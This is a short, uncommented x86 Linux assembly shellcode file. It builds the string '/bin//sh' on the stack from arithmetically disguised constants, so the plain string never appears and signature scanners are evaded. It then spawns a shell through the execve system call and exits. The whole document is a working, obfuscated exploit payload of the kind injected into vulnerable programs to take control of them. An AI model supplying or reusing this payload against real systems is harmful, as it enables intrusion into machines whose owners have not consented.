global _start           

section .text

_start:
    xor edx, edx    
    push edx
    mov eax, 0x563ED8B7
    add eax, 0x12345678
    push eax
    mov eax, 0xDEADC0DE
    sub eax, 0x70445EAF
    push eax
    push byte 0xb
    pop eax
    mov ecx, edx
    mov ebx, esp
    push byte 0x1
    pop esi
    int 0x80
    xchg esi, eax
    int 0x80
